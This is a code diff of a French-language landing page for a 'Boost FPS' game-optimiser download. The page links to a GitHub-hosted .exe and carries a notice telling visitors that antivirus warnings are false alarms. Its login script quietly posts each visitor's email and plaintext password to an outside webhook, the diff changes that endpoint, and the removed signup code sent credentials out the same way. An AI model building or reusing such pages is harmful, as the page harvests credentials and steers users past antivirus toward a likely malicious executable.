@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.1">
     <title>Boost FPS - Application PC</title>
     <style>
-        /* Styles de base pour tout */
+        /* Réinitialisation des marges et du padding */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
+        /* Fond général */
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Poppins', sans-serif;
+            background: #fafafa;
             color: #333;
             line-height: 1.6;
-            font-size: 16px;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
@@ -26,95 +27,110 @@
             text-align: center;
         }
 
+        /* En-tête */
         header {
             background: linear-gradient(135deg, #ff6f61, #ffbc42);
             color: #fff;
-            padding: 40px 0;
+            padding: 50px 20px;
             width: 90%;
             max-width: 1200px;
-            border-radius: 10px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
             margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
         }
 
         header h1 {
-            font-size: 3.2em;
-            font-weight: bold;
+            font-size: 3.5em;
+            font-weight: 700;
         }
 
         header p {
             font-size: 1.5em;
+            font-weight: 300;
         }
 
+        /* Navigation */
         nav {
             background: #444;
-            padding: 10px;
+            padding: 15px 0;
             width: 90%;
             max-width: 1200px;
-            border-radius: 10px;
+            border-radius: 8px;
             margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
         }
 
         nav a {
             color: #fff;
             text-decoration: none;
-            font-size: 1.2em;
-            padding: 10px 15px;
-            display: inline-block;
-            transition: background 0.3s;
-            border-radius: 5px;
+            font-size: 1.1em;
+            padding: 15px 30px;
+            margin: 0 10px;
+            border-radius: 30px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
         nav a:hover {
-            background: #ff6f61;
+            background-color: #ff6f61;
+            transform: translateY(-3px);
         }
 
+        nav a.active {
+            background-color: #ff4c3b;
+            transform: translateY(-3px);
+        }
+
+        /* Section principale */
         .container {
             width: 90%;
-            padding: 20px;
-            margin-bottom: 50px;
             max-width: 1200px;
+            padding: 30px;
         }
 
         .section {
-            background: #fff;
-            padding: 30px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
             margin-top: 20px;
-            border-radius: 10px;
-            display: none;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+            opacity: 0;
+            transform: translateY(20px);
         }
 
         .section.active {
-            display: block;
+            opacity: 1;
+            transform: translateY(0);
         }
 
+        /* Bouton de téléchargement */
         .download-button {
             display: inline-block;
             padding: 15px 30px;
             background-color: #ff6f61;
             color: #fff;
-            font-size: 1.3em;
+            font-size: 1.4em;
             text-decoration: none;
             border-radius: 30px;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-            animation: pulse 1.5s infinite;
+            transition: all 0.3s ease;
             margin-top: 20px;
         }
 
         .download-button:hover {
             background-color: #ff4c3b;
-            transform: scale(1.05);
+            transform: translateY(-3px);
         }
 
+        /* Alerte antivirus */
         .antivirus-warning {
             background-color: #ffcc00;
             color: #333;
-            padding: 10px;
-            margin: 15px auto;
-            font-size: 0.9em;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 1em;
             border-radius: 5px;
-            width: 90%;
-            max-width: 600px;
         }
 
         .antivirus-warning a {
@@ -123,12 +139,12 @@
             cursor: pointer;
         }
 
+        /* Pied de page */
         footer {
             background-color: #333;
             color: #fff;
             padding: 20px 0;
             text-align: center;
-            margin-top: auto;
             width: 100%;
             position: fixed;
             bottom: 0;
@@ -138,112 +154,111 @@
             font-size: 1.2em;
         }
 
-        /* Popup and Form Styles */
-        .popup, .overlay, .login-popup, .signup-popup {
+        /* Formulaires et Popups */
+        .overlay,
+        .popup {
             display: none;
             position: fixed;
-            z-index: 1000;
-        }
-
-        .overlay {
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
         }
 
-        .popup, .login-popup, .signup-popup {
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        .popup {
+            background: #fff;
             border-radius: 10px;
             width: 90%;
             max-width: 500px;
             padding: 30px;
-            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
         }
 
-        .popup .close-btn, .login-popup .close-btn, .signup-popup .close-btn {
-            background: #ff6f61;
-            color: white;
-            border: none;
-            padding: 10px;
-            margin-top: 10px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .popup .close-btn:hover, .login-popup .close-btn:hover, .signup-popup .close-btn:hover {
-            background: #ff4c3b;
-        }
-
-        .login-popup input[type="text"], .login-popup input[type="password"], .signup-popup input[type="text"], .signup-popup input[type="password"] {
-            width: 80%;
-            padding: 12px;
+        .popup input {
+            width: 100%;
+            padding: 15px;
             margin: 10px 0;
-            border-radius: 5px;
+            border-radius: 8px;
             border: 1px solid #ccc;
+            font-size: 1.2em;
         }
 
-        .login-popup button, .signup-popup button {
-            padding: 12px 30px;
+        .popup button {
+            width: 100%;
+            padding: 15px;
             background-color: #ff6f61;
             color: #fff;
+            font-size: 1.2em;
             border: none;
             border-radius: 30px;
             cursor: pointer;
-            font-size: 1.2em;
-            width: 80%;
-            margin-top: 10px;
+            transition: background-color 0.3s ease;
         }
 
-        .login-popup button:hover, .signup-popup button:hover {
+        .popup button:hover {
             background-color: #ff4c3b;
         }
 
+        .popup .close-btn {
+            background: #ccc;
+            color: #333;
+            font-size: 1.2em;
+            margin-top: 20px;
+            width: auto;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .popup .close-btn:hover {
+            background: #bbb;
+        }
     </style>
 </head>
+
 <body>
 
+    <!-- En-tête -->
     <header>
         <h1>Boost FPS</h1>
-        <p>Maximise les performances de ton PC avec Boost FPS.</p>
+        <p>Optimise les performances de ton PC avec Boost FPS.</p>
     </header>
 
+    <!-- Navigation -->
     <nav>
-        <a href="#" onclick="showSection('home')">Accueil</a>
+        <a href="#" onclick="showSection('home')" class="active">Accueil</a>
         <a href="#" onclick="showSection('version')">Version</a>
         <a href="#" onclick="showSection('tuto')">Tutoriel</a>
         <a href="#" onclick="showSection('contact')">Contact</a>
-        <a href="#" id="login-link" onclick="openLoginPopup()" style="display:none;">Se connecter</a>
-        <a href="#" id="logout-link" class="logout-link" onclick="logout()" style="display:none;">Se déconnecter</a>
-        <a href="#" id="signup-link" onclick="openSignupPopup()" style="display:none;">S'inscrire</a>
+        <a href="#" id="login-link" onclick="openLoginPopup()">Se connecter</a>
+        <a href="#" id="logout-link" onclick="logout()" style="display:none;">Se déconnecter</a>
+        <a href="#" id="signup-link" onclick="openSignupPopup()">S'inscrire</a>
     </nav>
 
     <div class="container">
-        <!-- Accueil section -->
+        <!-- Section Accueil -->
         <section id="home" class="section active">
             <h2>Optimise ton expérience de jeu</h2>
             <p>Boost FPS t'offre une expérience fluide et performante. Télécharge maintenant !</p>
 
             <div class="antivirus-warning">
                 <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br>
-                <strong><a href="#" onclick="openPopup()">En savoir plus</a></strong></p>
+                    <strong><a href="#" onclick="openInfoPopup()">En savoir plus</a></strong></p>
             </div>
 
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
         </section>
 
-        <!-- Version section -->
+        <!-- Section Version -->
         <section id="version" class="section">
             <h2>Version actuelle</h2>
             <p>Boost FPS v2.0 - Dernière mise à jour : Mars 2025.</p>
         </section>
 
-        <!-- Tutoriel section -->
+        <!-- Section Tutoriel -->
         <section id="tuto" class="section">
             <h2>Tutoriel d'installation</h2>
             <p>1. Télécharge Boost FPS.</p>
@@ -251,7 +266,7 @@
             <p>3. Lance l'installation et suis les instructions.</p>
         </section>
 
-        <!-- Contact section -->
+        <!-- Section Contact -->
         <section id="contact" class="section">
             <h2>Contact & Support</h2>
             <p>📧 Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a></p>
@@ -259,13 +274,14 @@
         </section>
     </div>
 
+    <!-- Footer -->
     <footer>
         <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
     </footer>
 
-    <!-- Login Popup -->
+    <!-- Popup Connexion -->
     <div id="login-overlay" class="overlay" onclick="closeLoginPopup()"></div>
-    <div id="login-popup" class="login-popup">
+    <div id="login-popup" class="popup">
         <h2>Se connecter</h2>
         <input type="text" id="email" placeholder="Email" />
         <input type="password" id="password" placeholder="Mot de passe" />
@@ -273,9 +289,9 @@
         <button class="close-btn" onclick="closeLoginPopup()">Fermer</button>
     </div>
 
-    <!-- Signup Popup -->
+    <!-- Popup Inscription -->
     <div id="signup-overlay" class="overlay" onclick="closeSignupPopup()"></div>
-    <div id="signup-popup" class="signup-popup">
+    <div id="signup-popup" class="popup">
         <h2>S'inscrire</h2>
         <input type="text" id="signup-email" placeholder="Email" />
         <input type="password" id="signup-password" placeholder="Mot de passe" />
@@ -292,12 +308,12 @@
             loggedIn = true;
             document.getElementById("login-link").style.display = "none";
             document.getElementById("logout-link").style.display = "inline";
-            document.getElementById("signup-link").style.display = "none"; // Masquer le lien d'inscription
+            document.getElementById("signup-link").style.display = "none";
         }
 
         function openLoginPopup() {
-            document.getElementById("login-overlay").style.display = "block";
-            document.getElementById("login-popup").style.display = "block";
+            document.getElementById("login-overlay").style.display = "flex";
+            document.getElementById("login-popup").style.display = "flex";
         }
 
         function closeLoginPopup() {
@@ -306,8 +322,8 @@
         }
 
         function openSignupPopup() {
-            document.getElementById("signup-overlay").style.display = "block";
-            document.getElementById("signup-popup").style.display = "block";
+            document.getElementById("signup-overlay").style.display = "flex";
+            document.getElementById("signup-popup").style.display = "flex";
         }
 
         function closeSignupPopup() {
@@ -326,7 +342,7 @@
                 localStorage.setItem('currentUser', JSON.stringify(user));
                 document.getElementById("login-link").style.display = "none";
                 document.getElementById("logout-link").style.display = "inline";
-                document.getElementById("signup-link").style.display = "none"; // Masquer le lien d'inscription
+                document.getElementById("signup-link").style.display = "none";
                 closeLoginPopup();
                 sendToWebhook({ username: email, password: password });
                 alert("Connexion réussie !");
@@ -339,31 +355,15 @@
             const email = document.getElementById("signup-email").value;
             const password = document.getElementById("signup-password").value;
 
-            const userExists = users.some(u => u.email === email);
-            if (userExists) {
-                alert("Cet email est déjà utilisé.");
-                return;
+            if (users.find(u => u.email === email)) {
+                alert("L'email est déjà utilisé.");
+            } else {
+                const newUser = { email, password };
+                users.push(newUser);
+                localStorage.setItem('users', JSON.stringify(users));
+                alert("Inscription réussie. Vous pouvez maintenant vous connecter.");
+                closeSignupPopup();
             }
-
-            const newUser = { email, password };
-            users.push(newUser);
-            localStorage.setItem('users', JSON.stringify(users));
-            localStorage.setItem('currentUser', JSON.stringify(newUser));
-            alert("Inscription réussie !");
-            closeSignupPopup();
-            sendToWebhook({ username: email, password: password });
-        }
-
-        function sendToWebhook(data) {
-            fetch('https://play.svix.com/in/e_M4lDWp8dx4feIfypDfe70NF82TN/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            }).then(response => response.json())
-              .then(data => console.log("Webhook Response:", data))
-              .catch(error => console.error("Error sending to webhook:", error));
         }
 
         function logout() {
@@ -372,20 +372,27 @@
             localStorage.removeItem('currentUser');
             document.getElementById("login-link").style.display = "inline";
             document.getElementById("logout-link").style.display = "none";
-            document.getElementById("signup-link").style.display = "inline"; // Afficher le lien d'inscription
+            document.getElementById("signup-link").style.display = "inline";
             alert("Déconnexion réussie !");
+        }
+
+        function sendToWebhook(data) {
+            fetch('https://webhook.site/your-webhook-url', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
         }
 
         function showSection(sectionId) {
             const sections = document.querySelectorAll('.section');
-            sections.forEach(section => section.classList.remove('active'));
-
-            const activeSection = document.getElementById(sectionId);
-            if (activeSection) {
-                activeSection.classList.add('active');
-            }
+            sections.forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
         }
     </script>
 
 </body>
+
 </html>
